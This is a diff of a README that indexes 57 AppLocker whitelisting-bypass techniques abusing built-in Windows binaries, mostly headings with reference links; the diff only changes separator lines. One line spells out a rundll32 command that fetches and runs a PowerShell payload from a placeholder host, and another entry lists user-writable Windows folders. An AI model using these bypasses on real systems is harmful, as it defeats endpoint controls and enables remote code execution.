@@ -1,7 +1,7 @@
 # myAPPLockerBypassSummary
 Simple APPLocker bypass summary based on the extensive work of @api0cradle
 
-
+--------------------------------------------------------------------------
  1. Rundll32.exe
 
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
@@ -28,7 +28,7 @@ I only tested on Windows 10 against the default rules, it could work against old
   * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Rundll32.md
   * https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
 
-#################################################
+--------------------------------------------------------------------------
  2. Regsvr32.exe
 
 
@@ -46,7 +46,7 @@ I only tested on Windows 10 against the default rules, it could work against old
   * https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
   * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md
 
-#################################################
+--------------------------------------------------------------------------
  3. Msbuild.exe
 
 
@@ -69,7 +69,7 @@ Notes:
   * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md
   * https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
 
-#################################################
+--------------------------------------------------------------------------
  4. Regsvcs.exe
 
 
@@ -90,7 +90,7 @@ Notes:
   * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md
   * https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
 
-#################################################
+--------------------------------------------------------------------------
  5. Regasm.exe
 
 
@@ -111,7 +111,7 @@ Notes:
   * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md
   * https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
 
-#################################################
+--------------------------------------------------------------------------
  6. Bginfo.exe
 
 
@@ -130,7 +130,7 @@ Will work if BGinfo.exe is located in a path that is trusted by the policy.
   * https://oddvar.moe/2017/05/22/clarification-bginfo-4-22-applocker-still-vulnerable/
   * https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/
 
-#################################################
+--------------------------------------------------------------------------
  7. InstallUtil.exe
 
 
@@ -152,7 +152,7 @@ Notes:
   * https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/
   * https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
 
-#################################################
+--------------------------------------------------------------------------
  8. MSDT.exe
 
 
@@ -169,7 +169,7 @@ Notes:
   * https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/
   * https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
 
-#################################################
+--------------------------------------------------------------------------
  9. mshta.exe
 
 
@@ -186,7 +186,7 @@ Notes:
   * https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
   * https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
 
-#################################################
+--------------------------------------------------------------------------
  10. Execute .Bat
 
 
@@ -203,7 +203,7 @@ Notes:
   * https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
   * https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
 
-#################################################
+--------------------------------------------------------------------------
  11. Execute .PS1
 
 
@@ -220,7 +220,7 @@ Notes:
   * https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
   * https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
 
-#################################################
+--------------------------------------------------------------------------
  12. Execute .VBS
 
 
@@ -237,7 +237,7 @@ Notes:
   * https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
   * https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
 
-#################################################
+--------------------------------------------------------------------------
  13. PresentationHost.exe
 
 
@@ -254,7 +254,7 @@ Notes:
   * https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
   * https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
 
-#################################################
+--------------------------------------------------------------------------
  14. dfsvc.exe
 
 
@@ -271,7 +271,7 @@ Notes:
 * Links:
   * https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
 
-#################################################
+--------------------------------------------------------------------------
  15. IEExec.exe
 
 
@@ -287,7 +287,7 @@ Notes:
 * Links:
   * https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/
 
-#################################################
+--------------------------------------------------------------------------
  16. cdb.exe
 
 
@@ -303,7 +303,7 @@ Notes:
 * Links:
   * http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html
 
-#################################################
+--------------------------------------------------------------------------
  17. dnx.exe
 
 
@@ -319,7 +319,7 @@ Notes:
 * Links:
   * https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/
 
-#################################################
+--------------------------------------------------------------------------
  18. rcsi.exe
 
 
@@ -335,7 +335,7 @@ Notes:
 * Links:
   * https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/
 
-#################################################
+--------------------------------------------------------------------------
  19. csi.exe
 
 
@@ -352,7 +352,7 @@ Notes:
   * https://web.archive.org/web/20161008143428/
   * http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html
 
-#################################################
+--------------------------------------------------------------------------
  20. CPL loading location manipulation
 
 
@@ -369,7 +369,7 @@ Notes:
   * https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/
   * https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/
 
-#################################################
+--------------------------------------------------------------------------
  21. msxsl.exe
 
 
@@ -388,7 +388,7 @@ Notes:
   * https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker
   * https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/
 
-#################################################
+--------------------------------------------------------------------------
  22. msiexec.exe
 
 
@@ -406,7 +406,7 @@ Notes:
 * Links:
   * https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
 
-#################################################
+--------------------------------------------------------------------------
  23. cmstp.exe
 
 
@@ -426,7 +426,7 @@ https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80
   * https://msitpros.com/?p=3960
   * https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e
 
-#################################################
+--------------------------------------------------------------------------
  24. xwizard.exe
 
 
@@ -444,7 +444,7 @@ Notes:
 * Links:
   * http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/
 
-#################################################
+--------------------------------------------------------------------------
  25. fsi.exe
 
 
@@ -462,7 +462,7 @@ Notes:
   * https://twitter.com/NickTyrer/status/904273264385589248
   * https://docs.microsoft.com/en-us/dotnet/fsharp/tutorials/fsharp-interactive/
 
-#################################################
+--------------------------------------------------------------------------
  26. odbcconf.exe
 
 
@@ -478,7 +478,7 @@ Notes:
 * Links:
   * https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b
 
-#################################################
+--------------------------------------------------------------------------
  27. te.exe
 
 
@@ -496,7 +496,7 @@ Default location is: C:\program files (x86)\Windows Kits\10\testing\Runtimes\TAE
   * https://twitter.com/gN3mes1s/status/927680266390384640
   * https://gist.github.com/N3mes1s/5b75a4cd6aa4d41bb742acace2c8ab42
 
-#################################################
+--------------------------------------------------------------------------
  28. Placing files in writeable paths under c:\windows
 
 The following folders are by default writable and executable by normal users
@@ -517,7 +517,7 @@ C:\windows\tracing
 
 Notes: This list is based on Windows 10 1709. Run accesschk to verify on other Windows versions
 
-#################################################
+--------------------------------------------------------------------------
  29. Atbroker.exe
 
 
@@ -533,7 +533,7 @@ Notes:
 * Links:
   * http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/
 
-#################################################
+--------------------------------------------------------------------------
  30. WMIC.exe
 
 
@@ -557,7 +557,7 @@ Notes:
   * https://subt0x11.blogspot.no/2018/04/wmicexe-whitelisting-bypass-hacking.html
   * https://gist.githubusercontent.com/caseysmithrc/68924cabbeca1285d2941298a5b91c24/raw/8574e0c019b17d84028833220ed0b30cf9eea84b/minimalist.xsl
 
-#################################################
+--------------------------------------------------------------------------
  31. MavInject32.exe
 
 
@@ -574,7 +574,7 @@ Notes:
   * https://twitter.com/gN3mes1s/status/941315826107510784
   * https://twitter.com/Hexacorn/status/776122138063409152
 
-#################################################
+--------------------------------------------------------------------------
  32. Pubprn.vbs
 
 
@@ -591,7 +591,7 @@ Notes:
   * https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
   * https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/
 
-#################################################
+--------------------------------------------------------------------------
  33. slmgr.vbs
 
 
@@ -608,7 +608,7 @@ Notes: Requires registry keys for com object.
   * https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
   * https://www.youtube.com/watch?v=3gz1QmiMhss
 
-#################################################
+--------------------------------------------------------------------------
  34. winrm.vbs
 
 
@@ -625,7 +625,7 @@ Notes: Requires registry keys for com object.
   * https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
   * https://www.youtube.com/watch?v=3gz1QmiMhss
 
-#################################################
+--------------------------------------------------------------------------
  35. forfiles.exe
 
 
@@ -641,7 +641,7 @@ Notes:
 * Links:
   * https://twitter.com/vector_sec/status/896049052642533376
 
-#################################################
+--------------------------------------------------------------------------
  36. SyncAppvPublishingServer.exe
 
 
@@ -657,7 +657,7 @@ Notes:
 * Links:
   * https://twitter.com/monoxgas/status/895045566090010624
 
-#################################################
+--------------------------------------------------------------------------
  37. InfDefaultInstall.exe
 
 
@@ -676,7 +676,7 @@ Only works on Windows 7? Windows 10 requires admin or digital signature
   * https://gist.github.com/KyleHanslovan/5e0f00d331984c1fb5be32c40f3b265a
   * https://blog.conscioushacker.io/index.php/2017/10/25/evading-microsofts-autoruns/
 
-#################################################
+--------------------------------------------------------------------------
  38. Winword.exe
 
 
@@ -692,7 +692,7 @@ Notes: No commonly made DLL example file
 * Links:
   * https://twitter.com/subTee/status/884615369511636992
 
-#################################################
+--------------------------------------------------------------------------
  39. Runscripthelper.exe
 
 
@@ -708,7 +708,7 @@ Notes:
 * Links:
   * https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthelper-exe-1906923658fc
 
-#################################################
+--------------------------------------------------------------------------
  40. Tracker.exe
 
 
@@ -726,7 +726,7 @@ Requires TrackerUI.dll present in 1028 subfolder.
 * Links:
   * https://twitter.com/Sudhanshu_C/status/943011972261412864
 
-#################################################
+--------------------------------------------------------------------------
  41. .WSF files
 
 
@@ -742,7 +742,7 @@ Notes:
 
 * Links:
 
-#################################################
+--------------------------------------------------------------------------
  42. PowerShell version 2
 
 
@@ -758,7 +758,7 @@ Bypasses Constrained language mode
 
 * Links:
 
-#################################################
+--------------------------------------------------------------------------
  43. CL_Invocation.ps1
 
 
@@ -777,7 +777,7 @@ Requires PowerShell version 2
 * Links:
   * https://twitter.com/bohops/status/948548812561436672
 
-#################################################
+--------------------------------------------------------------------------
  44. Incorrect permissions on files in folders
 
 
@@ -796,7 +796,7 @@ Notes:
 * Links:
   * https://twitter.com/Oddvarmoe/status/951757732557852673
 
-#################################################
+--------------------------------------------------------------------------
  45. Control.exe -Loading DLL/CPL binary from Alternate data stream
 
 
@@ -815,7 +815,7 @@ Requires write access to a place that is allowed by AppLocker
   * https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/
   * https://twitter.com/bohops/status/955659561008017409
 
-#################################################
+--------------------------------------------------------------------------
  46. Advpack.dll - LaunchINFSection
 
 
@@ -834,7 +834,7 @@ Notes:
   * https://twitter.com/bohops/status/967486047839014913
   * https://gist.githubusercontent.com/bohops/693dd4d5dbfb500f1c3ace02622d5d34/raw/902ed953a9188b27e91c199b465cddf855c7b94f/test.inf
 
-#################################################
+--------------------------------------------------------------------------
  47. Advpack.dll - RegisterOCX
 
 
@@ -851,7 +851,7 @@ Notes:
 * Links:
   * https://twitter.com/Moriarty_Meng/status/977848311603380224
 
-#################################################
+--------------------------------------------------------------------------
  48. zipfldr.dll - RouteTheCall
 
 
@@ -868,7 +868,7 @@ Notes:
 * Links:
   * https://twitter.com/Moriarty_Meng/status/977848311603380224
 
-#################################################
+--------------------------------------------------------------------------
  49. url.dll - OpenURL
 
 
@@ -887,7 +887,7 @@ Notes:
   * https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/
   * http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/
 
-#################################################
+--------------------------------------------------------------------------
  50. url.dll - FileProtocolHandler
 
 
@@ -904,7 +904,7 @@ Notes:
 * Links:
   * http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/
 
-#################################################
+--------------------------------------------------------------------------
  51. ieframe.dll - OpenURL
 
 
@@ -922,7 +922,7 @@ Notes:
   * https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/
   * http://www.hexacorn.com/blog/2018/03/15/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-5/
 
-#################################################
+--------------------------------------------------------------------------
  52. shdocvw.dll - OpenURL
 
 
@@ -940,7 +940,7 @@ Notes:
   * https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/
   * http://www.hexacorn.com/blog/2018/03/15/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-5/
 
-#################################################
+--------------------------------------------------------------------------
  53. ieadvpack.dll - LaunchINFSection
 
 
@@ -957,7 +957,7 @@ Notes:
 * Links:
   * https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
 
-#################################################
+--------------------------------------------------------------------------
  54. ie4unit.exe
 
 
@@ -975,7 +975,7 @@ Also need to add SCT in the MSIE4RegisterOCX.Windows7 section
 * Links:
   * https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
 
-#################################################
+--------------------------------------------------------------------------
  55. Visual Studio Tools for Office - .VSTO files
 
 
@@ -993,7 +993,7 @@ User needs to confirm installation after executing.
 * Links:
   * https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/
 
-#################################################
+--------------------------------------------------------------------------
  56. Manage-bde.wsf
 
 
@@ -1011,7 +1011,7 @@ Need to adjust comspec variable using: set comspec=c:\windows\system32\calc.exe
   * https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712
   * https://twitter.com/bohops/status/980659399495741441
 
-#################################################
+--------------------------------------------------------------------------
  57. msdeploy.exe
 
 
@@ -1029,4 +1029,4 @@ Part of web deploy:
 * Links:
   * https://twitter.com/pabraeken/status/999090532839313408
 
-#################################################
+--------------------------------------------------------------------------
